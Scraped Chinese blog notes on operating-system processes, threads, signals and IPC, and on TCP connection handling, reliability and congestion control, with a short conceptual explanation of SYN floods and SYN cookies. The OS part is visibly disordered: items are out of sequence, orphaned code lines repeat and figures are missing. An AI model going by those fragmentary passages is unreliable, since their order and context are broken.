3.阻塞（wait）态：又称等待态或睡眠态，指进程不具备运行条件，正在等待某个时间完成的状态。 各状态之间的转换： 2。僵尸进程：进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait 获waitpid 获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中的这些进程是僵尸进程。 线程产生的原因：进程可以使多个程序能并发执行，以提高资源的利用率和系统的吞吐量；但是其具有一些缺点： 引入线程就是为了解决以上进程的不足，线程具有以下的优点： 进程API以Unix系统为例，线程相关的API属于Posix线程(Pthreads)标准接口。 1void exit(int status); 进程如何通过管道进行通信 其本质是一个伪文件(实为内核缓冲区) 由两个文件描述符引用，一个表示读端，一个表示写端。 规定数据从管道的写端流入管道，从读端流出。 数据自己读不能自己写。 数据一旦被读走，便不在管道中存在，不可反复读取。 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。 只能在有公共祖先的进程间使用管道。 进程如何通过共享内存通信？ 共享内存是最快的一种IPC，因为进程是直接对内存进行操作来实现通信，避免了数据在用户空间和内核空间来回拷贝。 因为多个进程可以同时操作，所以需要进行同步处理。 信号量和共享内存通常结合在一起使用，信号量用来同步对共享内存的访问。 什么是信号 发送信号：内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两种原因： 内核检测到一个系统事件，比如除零错误或者子进程终止。 —个进程调用了kill 函数， 显式地要求内核发送一个信号给目的进程。一个进程可以发送信号给它自己。 接收信号：当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序(signal handler)的用户层函数捕获这个信号。 如何编写正确且安全的信号处理函数 处理程序要尽可能简单。避免麻烦的最好方法是保持处理程序尽可能小和简单。例如，处理程序可能只是简单地设置全局标志并立即返回；所有与接收信号相关的处理都由主程序执行，它周期性地检查(并重置)这个标志。 在处理程序中只调用异步信号安全的函数。所谓异步信号安全的函数(或简称安全的函数)能够被信号处理程序安全地调用，原因有二：要么它是可重入的(例如只访问局部变量），要么它不能被信号处理程序中断。 保存和恢复errno。许多Linux 异步信号安全的函数都会在出错返回时设置errno在处理程序中调用这样的函数可能会干扰主程序中其他依赖于分。解决方法是在进人处理程序时把errno 保存在一个局部变量中，在处理程序返回前恢复它。注意，只有在处理程序要返回时才有此必要。如果处理程序调用_exit终止该进程，那么就不需要这样做了。 阻塞所有的信号，保护对共享全局数据结构的访问。如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问(读或者写)该数据结构时，你的处理程序和主程序应该暂时阻塞所有的信号。这条规则的原因是从主程序访问一个数据结构d 通常需要一系列的指令，如果指令序列被访问d 的处理程序中断，那么处理程序可能会发现d 的状态不一致，得到不可预知的结果。在访问d 时暂时阻塞信号保证了处理程序不会中断该指令序列。 用volatile 声明全局变量。考虑一个处理程序和一个main 函数，它们共享一个全局变量g 。处理程序更新g，main 周期性地读g， 对于一个优化编译器而言，main 中g的值看上去从来没有变化过，因此使用缓存在寄存器中g 的副本来满足对g 的每次引用是很安全的。如果这样，main 函数可能永远都无法看到处理程序更新过的值。可以用volatile 类型限定符来定义一个变量，告诉编译器不要缓存这个变量。例如：volatile 限定符强迫编译器毎次在代码中引用g时，都要从内存中读取g的值。一般来说，和其他所有共享数据结构一样，应该暂时阻塞信号，保护每次对全局变量的访问。 1void exit(int status); 用sig_atomic_t声明标志。在常见的处理程序设计中，处理程序会写全局标志来记录收到了信号。主程序周期性地读这个标志，响应信号，再清除该标志。对于通过这种方式来共享的标志，C 提供一种整型数据类型sig_atomic_t对它的读和写保证会是原子的（不可中断的）。 信号的一个与直觉不符的方面是未处理的信号是不排队的。因为 pending 位向量中每种类型的信号只对应有一位，所以每种类型最多只能有一个未处理的信号。关键思想是如果存在一个未处理的信号就表明至少有一个信号到达了。 进程调度的时机 当前运行的进程运行结束。 当前运行的进程由于某种原因阻塞。 执行完系统调用等系统程序后返回用户进程。 在使用抢占调度的系统中，具有更高优先级的进程就绪时。 分时系统中，分给当前进程的时间片用完。 不能进行进程调度的情况 在中断处理程序执行时。 在操作系统的内核程序临界区内。 其它需要完全屏蔽中断的原子操作过程中。 进程调度策略的基本设计指标 CPU利用率 系统吞吐率，即单位时间内CPU完成的作业的数量。 响应时间。 周转时间。是指作业从提交到完成的时间间隔。从每个作业的角度看，完成每个作业的时间也是很关键 平均周转时间 带权周转时间 平均带权周转时间 进程的状态与状态转换 运行（running）态：进程占有处理器正在运行的状态。进程已获得CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态；在多处理机系统中，则有多个进程处于执行状态。 就绪→执行 处于就绪状态的进程，当进程调度程序为之分配了处理机后，该进程便由就绪状态转变成执行状态。 执行→就绪 处于执行状态的进程在其执行过程中，因分配给它的一个时间片已用完而不得不让出处理机，于是进程从执行状态转变成就绪状态。 执行→阻塞 正在执行的进程因等待某种事件发生而无法继续执行时，便从执行状态变成阻塞状态。 阻塞→就绪 处于阻塞状态的进程，若其等待的事件已经发生，于是进程由阻塞状态转变为就绪状态。 什么是孤儿进程？僵尸进程?孤儿进程：父进程退出，子进程还在运行的这些子进程都是孤儿进程，孤儿进程将被init进程（1号进程）所收养，并由init进程对他们完成状态收集工作。 什么是线程？ 是进程划分的任务，是一个进程内可调度的实体，是CPU调度的基本单位，用于保证程序的实时性，实现进程内部的并发。 线程是操作系统可识别的最小执行和调度单位。每个线程都独自占用一个虚拟处理器：独自的寄存器组，指令计数器和处理器状态。 每个线程完成不同的任务，但是属于同一个进程的不同线程之间共享同一地址空间（也就是同样的动态内存，映射文件，目标代码等等），打开的文件队列和其他内核资源。 为什么需要线程？ 进程在同一时刻只能做一个任务，很多时候不能充分利用CPU资源。 进程在执行的过程中如果发生阻塞，整个进程就会挂起，即使进程中其它任务不依赖于等待的资源，进程仍会被阻塞。 从资源上来讲，开辟一个线程所需要的资源要远小于一个进程。 从切换效率上来讲，运行于一个进程中的多个线程，它们之间使用相同的地址空间，而且线程间彼此切换所需时间也远远小于进程间切换所需要的时间（这种时间的差异主要由于缓存的大量未命中导致）。 从通信机制上来讲，线程间方便的通信机制。对不同进程来说，它们具有独立的地址空间，要进行数据的传递只能通过进程间通信的方式进行。线程则不然，属于同一个进程的不同线程之间共享同一地址空间，所以一个线程的数据可以被其它线程感知，线程间可以直接读写进程数据段（如全局变量）来进行通信（需要一些同步措施）。 简述线程和进程的区别和联系 一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。线程依赖于进程而存在。 进程在执行过程中拥有独立的地址空间，而多个线程共享进程的地址空间。（资源分配给进程，同一进程的所有线程共享该进程的所有资源。同一进程中的多个线程共享代码段（代码和常量），数据段（全局变量和静态变量），扩展段（堆存储）。但是每个线程拥有自己的栈段，栈段又叫运行时段，用来存放所有局部变量和临时变量。） 进程是资源分配的最小单位，线程是CPU调度的最小单位。 通信：由于同一进程中的多个线程具有相同的地址空间，使它们之间的同步和通信的实现，也变得比较容易。进程间通信IPC，线程间可以直接读写进程数据段（如全局变量）来进行通信（需要一些同步方法，以保证数据的一致性）。 进程编程调试简单可靠性高，但是创建销毁开销大；线程正相反，开销小，切换速度快，但是编程调试相对复杂。 进程间不会相互影响；一个进程内某个线程挂掉将导致整个进程挂掉。 进程适应于多核、多机分布；线程适用于多核。 多线程模型 多对一模型。将多个用户级线程映射到一个内核级线程上。该模型下，线程在用户空间进行管理，效率较高。缺点就是一个线程阻塞，整个进程内的所有线程都会阻塞。几乎没有系统继续使用这个模型。 一对一模型。将内核线程与用户线程一一对应。优点是一个线程阻塞时，不会影响到其它线程的执行。该模型具有更好的并发性。缺点是内核线程数量一般有上限，会限制用户线程的数量。更多的内核线程数目也给线程切换带来额外的负担。linux和Windows操作系统家族都是使用一对一模型。 多对多模型。将多个用户级线程映射到多个内核级线程上。结合了多对一模型和一对一模型的特点。 如何解决死锁问题？ 资源一次性分配，这样就不会再有请求了（破坏请求条件）。 只要有一个资源得不到分配，也不给这个进程分配其他的资源（破坏占有并等待条件）。 可抢占资源：即当进程新的资源未得到满足时，释放已占有的资源，从而破坏不可抢占的条件。 资源有序分配法：系统给每类资源赋予一个序号，每个进程按编号递增的请求资源，释放则相反，从而破坏环路等待的条件 请说一下什么是写时复制？ 如果有多个进程要读取它们自己的那部门资源的副本，那么复制是不必要的。每个进程只要保存一个指向这个资源的指针就可以了。只要没有进程要去修改自己的“副本”，就存在着这样的幻觉：每个进程好像独占那个资源。从而就避免了复制带来的负担。如果一个进程要修改自己的那份资源“副本”，那么就会复制那份资源，并把复制的那份提供给进程。不过其中的复制对进程来说是透明的。这个进程就可以修改复制后的资源了，同时其他的进程仍然共享那份没有修改过的资源。所以这就是名称的由来：在写入时进行复制。 算法的好处就在于它们尽量推迟代价高昂的操作，直到必要的时刻才会去执行。 在使用虚拟内存的情况下，写时复制（Copy-On-Write）是以页为基础进行的。所以，只要进程不修改它全部的地址空间，那么就不必复制整个地址空间。在fork()调用结束后，父进程和子进程都相信它们有一个自己的地址空间，但实际上它们共享父进程的原始页，接下来这些页又可以被其他的父进程或子进程共享。","link":"/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"title":"计算机网络","text":"TCP连接、Http/Https、Cookie/Session 分层 键入网址到网页显示，期间发生了什么？1、首先，在浏览器地址栏中输入url2、浏览器先查看浏览器缓存-系统缓存-路由器缓存，如果缓存中有，会直接在屏幕中显示页面内容。若没有，则跳到第三步操作。3、在发送http请求前，需要域名解析(DNS解析)，解析获取相应的IP地址。4、浏览器向服务器发起tcp连接，与浏览器建立tcp三次握手。5、握手成功后，浏览器向服务器发送http请求，请求数据包。6、服务器处理收到的请求，将数据返回至浏览器7、浏览器收到HTTP响应8、读取页面内容，浏览器渲染，解析html源码9、生成Dom树、解析css样式、js交互10、客户端和服务器交互 TCPTCP 是面向连接的、可靠的、基于字节流的传输层通信协议。 面向连接：一定是「一对一」才能连接，不能像 UDP 协议可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的； 可靠的：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端； 字节流：用户消息通过 TCP 协议传输时，消息可能会被操作系统「分组」成多个的 TCP 报文，如果接收方的程序如果不知道「消息的边界」，是无法读出一个有效的用户消息的。并且 TCP 报文是「有序的」，当「前一个」TCP 报文没有收到的时候，即使它先收到了后面的 TCP 报文，那么也不能扔给应用层去处理，同时对「重复」的 TCP 报文会自动丢弃。 TCP 连接建立TCP 是面向连接的协议，所以使用 TCP 前必须先建立连接，而建立连接是通过三次握手来进行的。三次握手的过程如下图： 一开始，客户端和服务端都处于 CLOSED 状态。先是服务端主动监听某个端口，处于 LISTEN 状态 客户端会随机初始化序号（client_isn），将此序号置于 TCP 首部的「序号」字段中，同时把 SYN 标志位置为 1 ，表示 SYN 报文。接着把第一个 SYN 报文发送给服务端，表示向服务端发起连接，该报文不包含应用层数据，之后客户端处于 SYN-SENT 状态。 服务端收到客户端的 SYN 报文后，首先服务端也随机初始化自己的序号（server_isn），将此序号填入 TCP 首部的「序号」字段中，其次把 TCP 首部的「确认应答号」字段填入 client_isn + 1, 接着把 SYN 和 ACK 标志位置为 1。最后把该报文发给客户端，该报文也不包含应用层数据，之后服务端处于 SYN-RCVD 状态。 客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文 TCP 首部 ACK 标志位置为 1 ，其次「确认应答号」字段填入 server_isn + 1 ，最后把报文发送给服务端，这次报文可以携带客户到服务器的数据，之后客户端处于 ESTABLISHED 状态。 服务器收到客户端的应答报文后，也进入 ESTABLISHED 状态。 从上面的过程可以发现第三次握手是可以携带数据的，前两次握手是不可以携带数据的，这也是面试常问的题。 为什么是三次握手？不是两次、四次？ 三次握手才可以阻止重复历史连接的初始化（主要原因） 三次握手才可以同步双方的初始序列号 三次握手才可以避免资源浪费 阻止重复历史连接的初始化（主要原因）简单来说，三次握手的首要原因是为了防止旧的重复连接初始化造成混乱。我们考虑一个场景，客户端先发送了 SYN（seq = 90） 报文，然后客户端宕机了，而且这个 SYN 报文还被网络阻塞了，服务端并没有收到，接着客户端重启后，又重新向服务端建立连接，发送了 SYN（seq = 100） 报文（注意不是重传 SYN，重传的 SYN 的序列号是一样的）。客户端连续发送多次 SYN 建立连接的报文，在网络拥堵情况下： 一个「旧 SYN 报文」比「最新的 SYN 」 报文早到达了服务端； 那么此时服务端就会回一个 SYN + ACK 报文给客户端； 客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送 RST 报文给服务端，表示中止这一次连接。 如果是两次握手连接，就无法阻止历史连接，那为什么 TCP 两次握手为什么无法阻止历史连接呢？主要是因为在两次握手的情况下，「被动发起方」没有中间状态给「主动发起方」来阻止历史连接，导致「被动发起方」可能建立一个历史连接，造成资源浪费。 同步双方的初始序列号TCP 协议的通信双方， 都必须维护一个「序列号」， 序列号是可靠传输的一个关键因素，它的作用： 接收方可以去除重复的数据； 接收方可以根据数据包的序列号按序接收； 可以标识发送出去的数据包中， 哪些是已经被对方收到的（通过 ACK 报文中的序列号知道）； 可见，序列号在 TCP 连接中占据着非常重要的作用，所以当客户端发送携带「初始序列号」的 SYN 报文的时候，需要服务端回一个 ACK 应答报文，表示客户端的 SYN 报文已被服务端成功接收，那当服务端发送「初始序列号」给客户端的时候，依然也要得到客户端的应答回应，这样一来一回，才能确保双方的初始序列号能被可靠的同步。四次握手其实也能够可靠的同步双方的初始化序号，但由于第二步和第三步可以优化成一步，所以就成了「三次握手」。而两次握手只保证了一方的初始序列号能被对方成功接收，没办法保证双方的初始序列号都能被确认接收。 避免资源浪费如果只有「两次握手」，当客户端的 SYN 请求连接在网络中阻塞，客户端没有接收到 ACK 报文，就会重新发送 SYN ，由于没有第三次握手，服务器不清楚客户端是否收到了自己发送的建立连接的 ACK 确认信号，所以每收到一个 SYN 就只能先主动建立一个连接，这会造成什么情况呢？如果客户端的 SYN 阻塞了，重复发送多次 SYN 报文，那么服务器在收到请求后就会建立多个冗余的无效链接，造成不必要的资源浪费。 小结TCP 建立连接时，通过三次握手能防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列号。序列号能够保证数据包不重复、不丢弃和按序传输。不使用「两次握手」和「四次握手」的原因： 「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号； 「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。 第一次握手丢失会发生什么当客户端想和服务端建立 TCP 连接的时候，首先第一个发的就是 SYN 报文，然后进入到 SYN_SENT 状态。在这之后，如果客户端迟迟收不到服务端的 SYN-ACK 报文（第二次握手），就会触发「超时重传」机制，重传 SYN 报文。通常，第一次超时重传是在 1 秒后，第二次超时重传是在 2 秒，第三次超时重传是在 4 秒后，第四次超时重传是在 8 秒后，第五次是在超时重传 16 秒后。没错，每次超时的时间是上一次的 2 倍。 第二次握手丢失会发生什么当服务端收到客户端的第一次握手后，就会回 SYN-ACK 报文给客户端，这个就是第二次握手，此时服务端会进入 SYN_RCVD 状态。第二次握手的 SYN-ACK 报文其实有两个目的 ： 第二次握手里的 ACK， 是对第一次握手的确认报文； 第二次握手里的 SYN，是服务端发起建立 TCP 连接的报文； 因为第二次握手报文里是包含对客户端的第一次握手的 ACK 确认报文，所以，如果客户端迟迟没有收到第二次握手，那么客户端就觉得可能自己的 SYN 报文（第一次握手）丢失了，于是客户端就会触发超时重传机制，重传 SYN 报文。然后，因为第二次握手中包含服务端的 SYN 报文，所以当客户端收到后，需要给服务端发送 ACK 确认报文（第三次握手），服务端才会认为该 SYN 报文被客户端收到了。那么，如果第二次握手丢失了，服务端就收不到第三次握手，于是服务端这边会触发超时重传机制，重传 SYN-ACK 报文。 第三次握手丢失会发生什么客户端收到服务端的 SYN-ACK 报文后，就会给服务端回一个 ACK 报文，也就是第三次握手，此时客户端状态进入到 ESTABLISH 状态。因为这个第三次握手的 ACK 是对第二次握手的 SYN 的确认报文，所以当第三次握手丢失了，如果服务端那一方迟迟收不到这个确认报文，就会触发超时重传机制，重传 SYN-ACK 报文，直到收到第三次握手，或者达到最大重传次数。注意，ACK 报文是不会有重传的，当 ACK 丢失了，就由对方重传对应的报文。 SYN攻击攻击者短时间伪造不同 IP 地址的 SYN 报文，服务端每接收到一个 SYN 报文，就进入SYN_RCVD 状态，但服务端发送出去的 ACK + SYN 报文，无法得到未知 IP 主机的 ACK 应答，久而久之就会占满服务端的半连接队列，使得服务器不能为正常用户服务。正常流程： 当服务端接收到客户端的 SYN 报文时，会将其加入到内核的「 SYN 队列」； 接着发送 SYN + ACK 给客户端，等待客户端回应 ACK 报文； 服务端接收到 ACK 报文后，从「 SYN 队列」移除放入到「 Accept 队列」； 应用通过调用 accpet() socket 接口，从「 Accept 队列」取出连接。 避免方式： 修改 Linux 内核参数，控制队列大小和当队列满时应做什么处理 当 「 SYN 队列」满之后，后续服务器收到 SYN 包，不进入「 SYN 队列」，计算出一个 cookie 值，再以 SYN + ACK 中的「序列号」返回客户端。服务端接收到客户端的应答报文时，服务器会检查这个 ACK 包的合法性。如果合法，直接放入到「 Accept 队列」，最后应用通过调用 accpet() socket 接口，从「 Accept 队列」取出的连接。TCP 连接断开TCP 断开连接是通过四次挥手方式。双方都可以主动断开连接，断开连接后主机中的「资源」将被释放，四次挥手的过程如下图： 客户端打算关闭连接，此时会发送一个 TCP 首部 FIN 标志位被置为 1 的报文，也即 FIN 报文，之后客户端进入 FIN_WAIT_1 状态。 服务端收到该报文后，就向客户端发送 ACK 应答报文，接着服务端进入 CLOSED_WAIT 状态。 客户端收到服务端的 ACK 应答报文后，之后进入 FIN_WAIT_2 状态。 等待服务端处理完数据后，也向客户端发送 FIN 报文，之后服务端进入 LAST_ACK 状态。 客户端收到服务端的 FIN 报文后，回一个 ACK 应答报文，之后进入 TIME_WAIT 状态 服务器收到了 ACK 应答报文后，就进入了 CLOSED 状态，至此服务端已经完成连接的关闭。 客户端在经过 2MSL 一段时间后，自动进入 CLOSED 状态，至此客户端也完成连接的关闭。 每个方向都需要一个 FIN 和一个 ACK，因此通常被称为四次挥手。这里一点需要注意是：主动关闭连接的，才有 TIME_WAIT 状态。 为什么是四次 关闭连接时，客户端向服务端发送 FIN 时，仅仅表示客户端不再发送数据了但是还能接收数据。 服务器收到客户端的 FIN 报文时，先回一个 ACK 应答报文，而服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送 FIN 报文给客户端来表示同意现在关闭连接。 从上面过程可知，服务端通常需要等待完成数据的发送和处理，所以服务端的 ACK 和 FIN 一般都会分开发送，从而比三次握手导致多了一次。 第一次挥手丢失会发生什么当客户端（主动关闭方）调用 close 函数后，就会向服务端发送 FIN 报文，试图与服务端断开连接，此时客户端的连接进入到 FIN_WAIT_1 状态。正常情况下，如果能及时收到服务端（被动关闭方）的 ACK，则会很快变为 FIN_WAIT2状态。如果第一次挥手丢失了，那么客户端迟迟收不到被动方的 ACK 的话，也就会触发超时重传机制，重传 FIN 报文，重发次数由 tcp_orphan_retries 参数控制。当客户端重传 FIN 报文的次数超过 tcp_orphan_retries 后，就不再发送 FIN 报文，直接进入到 close 状态。 第二次挥手丢失会发生什么当服务端收到客户端的第一次挥手后，就会先回一个 ACK 确认报文，此时服务端的连接进入到 CLOSE_WAIT 状态。在前面我们也提了，ACK 报文是不会重传的，所以如果服务端的第二次挥手丢失了，客户端就会触发超时重传机制，重传 FIN 报文，直到收到服务端的第二次挥手，或者达到最大的重传次数。当客户端收到第二次挥手，也就是收到服务端发送的 ACK 报文后，客户端就会处于 FIN_WAIT2 状态，在这个状态需要等服务端发送第三次挥手，也就是服务端的 FIN 报文。对于 close 函数关闭的连接，由于无法再发送和接收数据，所以FIN_WAIT2 状态不可以持续太久，而 tcp_fin_timeout 控制了这个状态下连接的持续时长，默认值是 60 秒。这意味着对于调用 close 关闭的连接，如果在 60 秒后还没有收到 FIN 报文，客户端（主动关闭方）的连接就会直接关闭。但是注意，如果主动关闭方使用 shutdown 函数关闭连接且指定只关闭发送方向，而接收方向并没有关闭，那么意味着主动关闭方还是可以接收数据的。如果主动关闭方一直没收到第三次挥手，那么主动关闭方的连接将会一直处于 FIN_WAIT2 状态（tcp_fin_timeout 无法控制 shutdown 关闭的连接）。 第三次挥手丢失会发生什么当服务端（被动关闭方）收到客户端（主动关闭方）的 FIN 报文后，内核会自动回复 ACK，同时连接处于 CLOSE_WAIT 状态，顾名思义，它表示等待应用进程调用 close 函数关闭连接。此时，内核是没有权利替代进程关闭连接，必须由进程主动调用 close 函数来触发服务端发送 FIN 报文。服务端处于 CLOSE_WAIT 状态时，调用了 close 函数，内核就会发出 FIN 报文，同时连接进入 LAST_ACK 状态，等待客户端返回 ACK 来确认连接关闭。如果迟迟收不到这个 ACK，服务端就会重发 FIN 报文，重发次数仍然由 tcp_orphan_retries 参数控制，这与客户端重发 FIN 报文的重传次数控制方式是一样的。 第四次挥手丢失会发生什么当客户端收到服务端的第三次挥手的 FIN 报文后，就会回 ACK 报文，也就是第四次挥手，此时客户端连接进入 TIME_WAIT 状态。在 Linux 系统，TIME_WAIT 状态会持续 2MSL 后才会进入关闭状态。然后，服务端（被动关闭方）没有收到 ACK 报文前，还是处于 LAST_ACK 状态。如果第四次挥手的 ACK 报文没有到达服务端，服务端就会重发 FIN 报文，重发次数仍然由前面介绍过的 tcp_orphan_retries 参数控制。 为什么 TIME_WAIT 等待的时间是 2MSL？MSL 是 Maximum Segment Lifetime，报文最大生存时间，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为 TCP 报文基于是 IP 协议的，而 IP 头中有一个 TTL 字段，是 IP 数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减 1，当此值为 0 则数据报将被丢弃，同时发送 ICMP 报文通知源主机。可以看到 2MSL时长 这其实是相当于至少允许报文丢失一次。比如，若 ACK 在一个 MSL 内丢失，这样被动方重发的 FIN 会在第 2 个 MSL 内到达，TIME_WAIT 状态的连接可以应对。为什么不是 4 或者 8 MSL 的时长呢？你可以想象一个丢包率达到百分之一的糟糕网络，连续两次丢包的概率只有万分之一，这个概率实在是太小了，忽略它比解决它更具性价比。2MSL 的时间是从客户端接收到 FIN 后发送 ACK 开始计时的。如果在 TIME-WAIT 时间内，因为客户端的 ACK 没有传输到服务端，客户端又接收到了服务端重发的 FIN 报文，那么 2MSL 时间将重新计时。 为什么要TIME_WAIT状态 防止历史连接中的数据，被后面相同四元组的连接错误的接收； 保证「被动关闭连接」的一方，能被正确的关闭； TCP为啥是可靠的TCP 是一个可靠传输的协议，那它是如何保证可靠的呢？为了实现可靠性传输，需要考虑很多事情，例如数据的破坏、丢包、重复以及分片顺序混乱等问题。如不能解决这些问题，也就无从谈起可靠传输。那么，TCP 是通过序列号、确认应答、重发控制、连接管理以及窗口控制等机制实现可靠性传输的。 重传机制TCP 实现可靠传输的方式之一，是通过序列号与确认应答。在 TCP 中，当发送端的数据到达接收主机时，接收端主机会返回一个确认应答消息，表示已收到消息。但在错综复杂的网络，并不一定能如上图那么顺利能正常的数据传输，万一数据在传输过程中丢失了呢？所以 TCP 针对数据包丢失的情况，会用重传机制解决。 超时重传上图中有两种超时时间不同的情况： 当超时时间 RTO 较大时，重发就慢，丢了老半天才重发，没有效率，性能差； 当超时时间 RTO 较小时，会导致可能并没有丢就重发，于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。 精确的测量超时时间 RTO 的值是非常重要的，这可让我们的重传机制更高效。根据上述的两种情况，我们可以得知，超时重传时间 RTO 的值应该略大于报文往返 RTT 的值。 快速重传 第一份 Seq1 先送到了，于是就 Ack 回 2； 结果 Seq2 因为某些原因没收到，Seq3 到达了，于是还是 Ack 回 2； 后面的 Seq4 和 Seq5 都到了，但还是 Ack 回 2，因为 Seq2 还是没有收到； 发送端收到了三个 Ack = 2 的确认，知道了 Seq2 还没有收到，就会在定时器过期之前，重传丢失的 Seq2。 最后，收到了 Seq2，此时因为 Seq3，Seq4，Seq5 都收到了，于是 Ack 回 6 。 快速重传机制只解决了一个问题，就是超时时间的问题，但是它依然面临着另外一个问题。就是重传的时候，是重传之前的一个，还是重传所有的问题。比如对于上面的例子，是重传 Seq2 呢？还是重传 Seq2、Seq3、Seq4、Seq5 呢？因为发送端并不清楚这连续的三个 Ack 2 是谁传回来的。 SACK选择性确认这种方式需要在 TCP 头部「选项」字段里加一个 SACK 的东西，它可以将缓存的地图发送给发送方，这样发送方就可以知道哪些数据收到了，哪些数据没收到，知道了这些信息，就可以只重传丢失的数据。 滑动窗口我们都知道 TCP 是每发送一个数据，都要进行一次确认应答。当上一个数据包收到了应答了， 再发送下一个。但这种方式的缺点是效率比较低的。为解决这个问题，TCP 引入了窗口这个概念。即使在往返时间较长的情况下，它也不会降低网络通信的效率。那么有了窗口，就可以指定窗口大小，窗口大小就是指无需等待确认应答，而可以继续发送数据的最大值。窗口的实现实际上是操作系统开辟的一个缓存空间，发送方主机在等到确认应答返回之前，必须在缓冲区中保留已发送的数据。如果按期收到确认应答，此时数据就可以从缓存区清除。 #1 是已发送并收到 ACK确认的数据：1~31 字节 #2 是已发送但未收到 ACK确认的数据：32~45 字节 #3 是未发送但总大小在接收方处理范围内（接收方还有空间）：46~51字节 #4 是未发送但总大小超过接收方处理范围（接收方没有空间）：52字节以后 在下图，当收到之前发送的数据 3236 字节的 ACK 确认应答后，如果发送窗口的大小没有变化，则滑动窗口往右边移动 5 个字节，因为有 5 个字节的数据被应答确认，接下来 5256 字节又变成了可用窗口，那么后续也就可以发送 52~56 这 5 个字节的数据了。TCP 滑动窗口方案使用三个指针来跟踪在四个传输类别中的每一个类别中的字节。其中两个指针是绝对指针（指特定的序列号），一个是相对指针（需要做偏移）。 流量控制发送方不能无脑的发数据给接收方，要考虑接收方处理能力。如果一直无脑的发数据给对方，但对方处理不过来，那么就会导致触发重发机制，从而导致网络流量的无端的浪费。为了解决这种现象发生，TCP 提供一种机制可以让「发送方」根据「接收方」的实际接收能力控制发送的数据量，这就是所谓的流量控制。 拥塞控制一般来说，计算机网络都处在一个共享的环境。因此也有可能会因为其他主机之间的通信使得网络拥堵。在网络出现拥堵时，如果继续发送大量数据包，可能会导致数据包时延、丢失等，这时 TCP 就会重传数据，但是一重传就会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，这个情况就会进入恶性循环被不断地放大….所以，TCP 不能忽略网络上发生的事，它被设计成一个无私的协议，当网络发送拥塞时，TCP 会自我牺牲，降低发送的数据量。于是，就有了拥塞控制，控制的目的就是避免「发送方」的数据填满整个网络。为了在「发送方」调节所要发送数据的量，定义了一个叫做「拥塞窗口」的概念。拥塞窗口 cwnd是发送方维护的一个的状态变量，它会根据网络的拥塞程度动态变化的。我们在前面提到过发送窗口 swnd 和接收窗口 rwnd 是约等于的关系，那么由于加入了拥塞窗口的概念后，此时发送窗口的值是swnd = min(cwnd, rwnd)，也就是拥塞窗口和接收窗口中的最小值。拥塞窗口 cwnd 变化的规则： 只要网络中没有出现拥塞，cwnd 就会增大； 但网络中出现了拥塞，cwnd 就减少； 慢启动TCP 在刚建立连接完成后，首先是有个慢启动的过程，这个慢启动的意思就是一点一点的提高发送数据包的数量，如果一上来就发大量的数据，这不是给网络添堵吗？慢启动的算法记住一个规则就行：当发送方每收到一个 ACK，拥塞窗口 cwnd 的大小就会加 1。可以看出慢启动算法，发包的个数是指数性的增长。有一个叫慢启动门限 ssthresh （slow start threshold)状态变量。 当 cwnd &lt; ssthresh 时，使用慢启动算法。 当 cwnd &gt;= ssthresh 时，就会使用「拥塞避免算法」。 拥塞避免算法前面说道，当拥塞窗口 cwnd 「超过」慢启动门限 ssthresh 就会进入拥塞避免算法。一般来说 ssthresh 的大小是 65535 字节。那么进入拥塞避免算法后，它的规则是：每当收到一个 ACK 时，cwnd 增加 1/cwnd。接上前面的慢启动的栗子，现假定 ssthresh 为 8： 当 8 个 ACK 应答确认到来时，每个确认增加 1/8，8 个 ACK 确认 cwnd 一共增加 1，于是这一次能够发送 9 个 MSS 大小的数据，变成了线性增长。 所以，我们可以发现，拥塞避免算法就是将原本慢启动算法的指数增长变成了线性增长，还是增长阶段，但是增长速度缓慢了一些。就这么一直增长着后，网络就会慢慢进入了拥塞的状况了，于是就会出现丢包现象，这时就需要对丢失的数据包进行重传。 拥塞发生当网络出现拥塞，也就是会发生数据包重传，重传机制主要有两种： 超时重传 快速重传 当发生了「超时重传」，则就会使用拥塞发生算法。这个时候，ssthresh 和 cwnd 的值会发生变化： ssthresh 设为 cwnd/2， cwnd 重置为 1 （是恢复为 cwnd 初始化值，我这里假定 cwnd 初始化值 1） 快速恢复快速重传和快速恢复算法一般同时使用，快速恢复算法是认为，你还能收到 3 个重复 ACK 说明网络也不那么糟糕，所以没有必要像 RTO 超时那么强烈。正如前面所说，进入快速恢复之前，cwnd 和 ssthresh 已被更新了： cwnd = cwnd/2 ，也就是设置为原来的一半; ssthresh = cwnd; 然后，进入快速恢复算法如下： 拥塞窗口 cwnd = ssthresh + 3 （ 3 的意思是确认有 3 个数据包被收到了）； 重传丢失的数据包； 如果再收到重复的 ACK，那么 cwnd 增加 1； 如果收到新数据的 ACK 后，把 cwnd 设置为第一步中的 ssthresh 的值，原因是该 ACK 确认了新的数据，说明从 duplicated ACK 时的数据都已收到，该恢复过程已经结束，可以回到恢复之前的状态了，也即再次进入拥塞避免状态； UDP TCP？ UDP是无连接的； UDP使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态（这里面有许多参数）； UDP是面向报文的； UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）； UDP支持一对一、一对多、多对一和多对多的交互通信； UDP的首部开销小，只有8个字节，比TCP的20个字节的首部要短。 